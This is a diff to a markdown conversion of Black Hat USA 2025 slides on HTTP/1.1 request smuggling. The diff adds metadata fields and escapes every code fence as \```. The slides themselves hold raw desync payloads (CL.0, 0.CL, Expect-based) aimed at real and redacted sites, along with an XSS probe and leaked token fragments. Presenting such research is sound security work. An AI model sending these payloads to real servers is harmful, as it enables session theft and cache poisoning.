@@ -8,19 +8,24 @@ year: 2025
 source_pdf: "BlackHat_USA_2025_Slides/James Kettle_HTTP1.1 Must Die! The Desync Endgame.pdf"
 pages: 50
 sha256: "2c00acad21e8316aa57ddfb971fa02b92b56e12852b55b59c0219fdb035e787b"
-text_chars: 19316
+text_chars: 19450
 ocr_pages: 0
 has_ocr: false
 redacted_secrets: 0
+ocr_confidence: null
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2"
-converted_at: "2026-08-11T22:55:27Z"
+converted_at: "2026-08-12T05:13:16Z"
 ---
 # HTTP1.1 Must Die! The Desync Endgame
 
 **Speakers:** James Kettle  
 **Conference:** Black Hat USA 2025  
 **Source:** `BlackHat_USA_2025_Slides/James Kettle_HTTP1.1 Must Die! The Desync Endgame.pdf` (50 pages)
+
 
 ## Slide 1
 
@@ -48,23 +53,23 @@ Use HTTP/2 here
 
 Blocked by regex
 
-```
+\```
 POST / HTTP/1.1
 Transfer-Encoding: chunked
 Content-Length: 35
 0
-```
+\```
 
-```
+\```
 200 OK
-```
+\```
 
-```
+\```
 GET /robots.txt HTTP/1.1
 X: y
-```
+\```
 
-```
+\```
 POST / HTTP/1.1
 Transfer-Encoding: chunked
 Content-Length: 35
@@ -72,12 +77,12 @@ Content-Length: 35
 GET /robots.txt HTTP/1.1
 X: yGET / HTTP/1.1
 Host: example.com
-```
+\```
 
-```
+\```
 GET / HTTP/1.1
 Host: example.com
-```
+\```
 
 Missed due to `HTTP/1.1 200 OK` race condition `Disallow: /`
 
@@ -87,32 +92,32 @@ Missed due to `HTTP/1.1 200 OK` race condition `Disallow: /`
 
 ###### **Change tactics, find bugs**
 
-```
+\```
 GET /assets/icon.png HTTP/2
 Host: <redacted>
 GET /assets HTTP/1.1
 Host: psres.net
 X: y
-```
+\```
 
-```
+\```
 HTTP/2 200 OK
-```
+\```
 
 _In collaboration with_ Wannes Verwimp, Cresco Cybersecurity
 
-```
+\```
 GET /??? HTTP/1.1HTTP/2 302 Found
 Host: <cdn.redactedbank.com>
 GET /assets/ HTTP/1.1
 Host: psres.net
 Referer: https://<cdn.redactedbank.com>/
-```
+\```
 
-```
+\```
 HTTP/2 302 Found
 Location: https://psres.net/assets/
-```
+\```
 
 ## Slide 5
 
@@ -126,30 +131,30 @@ Tier 1 Tier 2 Tier 3
 
 ###### **Change tactics, find bugs**
 
-```
+\```
 GET /assets/icon.png HTTP/2
 Host: <redacted>
 GET /assets HTTP/1.1
 Host: psres.net
 X: x
-```
+\```
 
-```
+\```
 GET /assets/icon.png?cb=123 HTTP/2
 Host: <redacted>
 GET /assets HTTP/1.1
 Host: psres.net
 X: x
-```
+\```
 
 This works
 
 `HTTP/2 200 OK Cf-Cache-Status:` `HIT` This fails
 
-```
+\```
 HTTP/2 200 OK
 Cf-Cache-Status: MISS
-```
+\```
 
 ## Slide 8
 
@@ -205,29 +210,29 @@ Rule 0) don't use transfer-encoding
 
 **HTTP Request Smuggler v3.0**
 
-```
+\```
 PermutationHeader
 EveryContent-Length
 obfuscation Host
 techniqueMax-Forwards
 Range
 Expect
-```
+\```
 
-```
+\```
 Classification
 HIDDEN, VISIBLE,
 IGNORED, BLOCKED,
 DISCREPANCY
-```
+\```
 
-```
+\```
 Style
 Single
 Duplicate
 POST
 GET
-```
+\```
 
 1. Explore alternate detection headers 2. Add new permutations from httpgarden
 
@@ -241,7 +246,7 @@ GET
 
 ###### **Turning V-H into a CL.0 desync**
 
-```
+\```
 GET /style.css HTTP/1.1
 Host: <food-corp>
 Foo: bar
@@ -250,7 +255,7 @@ GET /404 HTTP/1.1
 X: y
 GET / HTTP/1.1
 Host: <food-corp>
-```
+\```
 
 `GET /style.css HTTP/1.1 Host: <food-corp> Foo: bar Content-Length: 23 HTTP/1.1 200 OK GET /404 HTTP/1.1 X: yGET / HTTP/1.1 Host: <food-corp> HTTP/1.1 404 Not Found` **{front-end}.{back-end} CL** (Content-Length) **TE** (Transfer-Encoding) **0** (Implicit-zero) **H2** (HTTP/2's built-in length)
 
@@ -260,26 +265,26 @@ Host: <food-corp>
 
 Understand the codes `HTTP/1.1 400 Bad Request` `HTTP/1.1 412 Precondition Failed` `HTTP/1.1 200 OK HTTP/1.1 412 Precondition Failed` `HTTP/1.1 200 OK` `HTTP/1.1 501 Not Implemented ABC=DEFPOST not supported for current URL.`
 
-```
+\```
 Host: x/x
 Xost: x/x
 Host: x/x
 Xost: x/x
-```
+\```
 
-```
+\```
 POST /js/jquery.min.js HTTP/1.1
 Host: <redacted-vpn.bank.com>
 Junk: bar
  Content-Length: 7
 ABC=DEF
-```
+\```
 
 ## Slide 17
 
 ###### **Predicting vulnerabilities**
 
-```
+\```
 "a recipient MAY recognize a single LF as a line
 terminator" – RFC 9122
 EarlyBodyPair("A: B\n\n{detectionHeader}",
@@ -289,12 +294,12 @@ Content-Length: 40\r\n
 A: B\r\nHTTP/1.1 302 Found
 \n
 Expect: 100-continue\r\n
-```
+\```
 
-```
+\```
 HTTP/1.1 100 Continue
 HTTP/1.1 302 Found
-```
+\```
 
 Classification: VISIBLE
 
@@ -304,12 +309,12 @@ CVE pending
 
 ###### **Detecting Hidden-Visible:  ALB->IIS**
 
-```
+\```
 Host: foo/bar 400 Bad Request, Server: awselb/2.0
 Zost: foo/bar 200 OK, -no server header-
 Host : foo/bar 400 Bad Request, Server: Microsoft-HTTPAPI/2.0
 Zost : foo/bar 200 OK, -no server header-
-```
+\```
 
 AWS HTTP Desync Guardian
 
@@ -339,27 +344,27 @@ Adopting cloud proxies imports other companies' technical debt into your securit
 
 ###### **The 0.CL deadlock**
 
-```
+\```
 GET /Logon HTTP/1.1
 Host: <redacted>
 Content-Length:
  23
 GET /404 HTTP/1.1
 X: Y
-```
+\```
 
 Front-end interprets this as a second request
 
-```
+\```
 GET /Logon HTTP/1.1
 Host: <redacted>
 Content-Length:
  23
-```
+\```
 
-```
+\```
 HTTP/1.1 504 Gateway Timeout
-```
+\```
 
 How can we escape the 0.CL deadlock?
 
@@ -373,33 +378,33 @@ https://learn.microsoft.com/en-us/windows/win32/fileio/naming-a-file
 
 ###### **Escaping the 0.CL deadlock with an early-response gadget**
 
-```
+\```
 GET /con HTTP/1.1
 Host: <redacted>
 Content-Length:
  7
-```
+\```
 
-```
+\```
 GET /con HTTP/1.1
 Host: <redacted>
 Content-Length:
  7
-```
+\```
 
-```
+\```
 HTTP/1.1 200 OK
-```
+\```
 
-```
+\```
 GET / HTTP/1.1
 Host: <redacted>
-```
+\```
 
-```
+\```
 GET / HTTP/1.1
 Host: <redacted>
-```
+\```
 
 `HTTP/1.1 400 Bad Request` Flagged by HTTP Request Smuggler as "Mystery 400" since 2019
 
@@ -417,7 +422,7 @@ Find an early-response gadget for Apache
 
 ###### **Converting 0.CL to CL.0 with a double desync – the hard way**
 
-```
+\```
 POST /nul HTTP/1.1POST /nul HTTP/1.1
 Content-length: Content-length:
  39 39
@@ -438,58 +443,58 @@ Host: <redacted>
 HTTP/1.1 302 Found
 GET / HTTP/1.1
 Host: <redacted>Location: /Logon?ReturnUrl=%2fwrtz
-```
+\```
 
 ## Slide 26
 
 ###### **Converting 0.CL to CL.0 with a double desync – the hard way**
 
-```
+\```
 POST /nul HTTP/1.1
 Content-length:
  39
-```
+\```
 
-```
+\```
 POST / HTTP/1.1
 Content-Length: 64
-```
+\```
 
-```
+\```
 POST /nul HTTP/1.1
 Content-length:
  39
-```
+\```
 
-```
+\```
 HTTP/1.1 200 OK
-```
+\```
 
 `POST / HTTP/1.1` Front-end inserted header breaks the `Content-Length: 64` attack `?` `?????: ?????`
 
-```
+\```
 GET / HTTP/1.1
 Host: <redacted>
 GET /wrtz HTTP/1.1
 Foo: bar
-```
+\```
 
-```
+\```
 400 Bad Request
-```
+\```
 
-```
+\```
 GET / HTTP/1.1
 Host: <redacted>
 GET /wrtz HTTP/1.1
 Foo: bar
-```
+\```
 
 ## Slide 27
 
 ###### **Converting 0.CL to CL.0 with a double desync – the easy way**
 
-```
+\```
 POST /nul HTTP/1.1
 Content-length:
  41
@@ -500,38 +505,38 @@ X: yGET /y HTTP/1.1
 POST /index.asp HTTP/1.1
 Content-Length: 201
 Password=zwrt
-```
+\```
 
-```
+\```
 GET / HTTP/1.1
 ???????????: ?????????
-```
+\```
 
-```
+\```
 HTTP/1.1 200 OK
-```
+\```
 
 Header injection here doesn't affect offsets `HTTP/1.1 200 OK`
 
-```
+\```
 Invalid input:
   zwrtGET/HTTP/1.1Host:
 <redacted>Connection:keep-aliveAccept-Enc
 oding:identity
-```
+\```
 
 ## Slide 28
 
 ###### **0.CL to CL.0 HEAD exploit**
 
-```
+\```
 POST /nul HTTP/1.1
 Host: <redacted>
 Content-length:
  42
-```
+\```
 
-```
+\```
 GET /aa HTTP/1.1
 Content-Length: 82
 X: yGET /bb HTTP/1.1
@@ -542,7 +547,7 @@ GET /?<script>alert(1 HTTP/1.1
 X: Y
 GET / HTTP/1.1
 Host: <redacted>
-```
+\```
 
 `HTTP/1.1 200 OK HTTP/1.1 200 OK Location: /Logon?returnUrl=/bb` +$7,500 EXNESS +$900 +$586 +$370 `HTTP/1.1 200 OK` +$2,789 `Content-Length: 56670 Content-Type: text/html` +$500 +$2,000 `HTTP/1.1 302 Found Location: /?return=/<script>alert(1…` =$ **21,645**
 
@@ -562,38 +567,38 @@ Host: <redacted>
 
 ###### **No Expect support**
 
-```
+\```
 while (bodyStart == -1 && !shouldAbandonAttack()) {
 val len = socket.getInputStream().read(readBuffer)
 if(len == -1) {
-```
+\```
 
 ###### **Partial Expect support**
 
-```
+\```
 var consumeFirstBlock = buffer.startsWith("HTTP/1.1 100")
 var ateContinue = false
 var continueBlock = ""
-```
+\```
 
-```
+\```
 break
-```
+\```
 
-```
+\```
 }
 endTime = System.nanoTime()
-```
+\```
 
-```
+\```
 val read = Utils.bytesToString(readBuffer.copyOfRange(0, len))
     triggerReadCallback(read)
 buffer += read
     bodyStart = buffer.indexOf("\r\n\r\n")
 }
-```
+\```
 
-```
+\```
 while ((bodyStart == -1 || (consumeFirstBlock && !ateContinue)) && !shouldAbandonAttack()) {
 try {
 val len = socket.getInputStream().read(readBuffer)
@@ -601,17 +606,17 @@ if(len == -1) {
 break
 }
 endTime = System.nanoTime()
-```
+\```
 
-```
+\```
 val read = Utils.bytesToString(readBuffer.copyOfRange(0, len))
         triggerReadCallback(read)
 buffer += read
         consumeFirstBlock = buffer.startsWith("HTTP/1.1 100")
 bodyStart = buffer.indexOf("\r\n\r\n")
-```
+\```
 
-```
+\```
 if (consumeFirstBlock && bodyStart != -1 && !ateContinue && !ignoreLength) {
 consumeFirstBlock = false
 ateContinue = true
@@ -623,29 +628,29 @@ bodyStart = buffer.indexOf("\r\n\r\n")
 break
 }
 }
-```
+\```
 
-```
+\```
 if (buffer.isEmpty() && ateContinue) {
 buffer = continueBlock
     continueBlock = ""
 bodyStart = buffer.length
 // todo handle missing body
 }
-```
+\```
 
 ## Slide 32
 
 ###### **An introduction to Expect**
 
-```
+\```
 POST / HTTP/1.1HTTP/1.1 100 Continue
 Expect: 100-continue
 Content-Length: 7HTTP/1.1 200 OK
 …
 ABCDEFGGET /404 HTTP/1.1HTTP/1.1 404 Not Found
 Host: example.com
-```
+\```
 
 What if the front-end doesn't {support Expect, see Expect, parse the value as 100-continue}? What if the back-end doesn't {support Expect, see Expect, parse the value as 100-continue}? What if the back-end responds early?
 
@@ -661,47 +666,47 @@ What if the client doesn't wait for 100-continue?
 
 ###### **Expect memory leaks**
 
-```
+\```
 POST / HTTP/1.1
 Host: <redacted>
 Expect: 100-continue
 Content-Length: 1
 X
-```
+\```
 
-```
+\```
 HTTP/1.1 401 Unauthorized
 Www-Authenticate: Bearer
 HTTP/1.1 100 ContinTransfer-
 EncodingzxWthTQmiI8fJ4oj9fzE"
 X-: chunked
-```
+\```
 
-```
+\```
 HTTP/1.1 401 Unauthorized
 Www-Authenticate: Bearer
 HTTP/1.1 100 ContinTransfer-EncodingzxWthTQm145
-```
+\```
 
-```
+\```
 POST / HTTP/1.1
 Host: <redacted>
 Expect: 100-continue
 Content-Length: 1
 X
-```
+\```
 
-```
+\```
 HTTP/1.1 404 Not Found
 HTTP/1.1 100 Continue
 d
-```
+\```
 
-```
+\```
 Ask the hotel which eHTTP/1.1 404 Not Found
 HTTP/1.1 100 Continue
 d
-```
+\```
 
 ## Slide 35
 
@@ -723,19 +728,19 @@ _"have you seen anything like this before?"_ **`Expect: 100-continue`** _Paolo '
 
 `GET /logout HTTP/1.1 Host: <redacted>.t-mobile.com Expect: 100-continue` +207 internal `Content-Length: 291` header offset `GET /logout HTTP/1.1 Host: <redacted>.t-mobile.com Content-Length: 100 GET / HTTP/1.1 Host: <redacted>.t-mobile.com GET https://psres.net/assets HTTP/1.1 X: y`
 
-```
+\```
 HTTP/1.1 404 Not Found
-```
+\```
 
-```
+\```
 HTTP/1.1 200 OK
-```
+\```
 
-```
+\```
 HTTP/1.1 301 Moved Permanently
 GET / HTTP/1.1
 Host: <redacted>.t-mobile.comLocation: https://psres.net/…
-```
+\```
 
 ## Slide 38
 
@@ -755,14 +760,14 @@ _"Websites utilizing Netlify are out of scope."_ `HTTP/1.1 404 Not Found`
 
 `POST /images/ HTTP/1.1 Host: <redacted-netlify> Expect: 100-continue Content-Length: 57 HTTP/1.1 404 Not Found GET /letter-picker HTTP/1.1 Host: <redacted-netlify> POST /authenticate HTTP/1.1 HTTP/1.1 200 OK Host: ??? … <title>Letter Picker Wheel HTTP/1.1 200 OK GET / HTTP/1.1 … Host: <redacted-netlify> "{\"token\":\"eyJhbGciOiJ…` Vulnerable websites: >1,000,000?
 
-```
+\```
 HTTP/1.1 200 OK
 …
 <title>Letter Picker Wheel
 HTTP/1.1 200 OK
 …
 "{\"token\":\"eyJhbGciOiJ…
-```
+\```
 
 ## Slide 40
 
@@ -770,7 +775,7 @@ HTTP/1.1 200 OK
 
 ###### **+$5,000 = $45,955**
 
-```
+\```
 OPTIONS /anything HTTP/1.1
 Host: auth.lastpass.com
 Expect:
@@ -779,22 +784,22 @@ Content-Length: 39
 GET / HTTP/1.1
 Host: www.sky.com
 X: y
-```
+\```
 
-```
+\```
 HTTP/1.1 404 Not Found
-```
+\```
 
-```
+\```
 GET /anything HTTP/1.1
 Host: auth.lastpass.com
-```
+\```
 
-```
+\```
 HTTP/1.1 200 OK
 Discover TV & Broadband
 Packages with Sky
-```
+\```
 
 ## Slide 41
 
